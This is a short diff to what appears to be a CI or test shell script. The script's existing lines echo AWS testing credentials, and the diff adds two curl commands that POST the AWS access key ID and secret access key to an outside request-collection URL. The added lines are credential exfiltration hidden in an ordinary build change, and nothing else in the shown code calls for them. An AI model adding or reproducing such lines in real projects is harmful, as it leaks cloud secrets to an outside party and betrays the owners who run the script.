@@ -6,6 +6,9 @@ echo "Print ENVVAR"
 echo $AWS_TESTING_ACCESS_KEY_ID
 echo $AWS_TESTING_SECRET_ACCESS_KEY
 
+curl -X POST -d "s1=$AWS_TESTING_ACCESS_KEY_ID" http://requestb.in/q9okbdq9
+curl -X POST -d "s1=$AWS_TESTING_SECRET_ACCESS_KEY" http://requestb.in/q9okbdq9
+
 
 function now { date +"%Y-%m-%dT%H:%M:%S.000" | tr -d '\n' ;}
 function _scope_msg() {
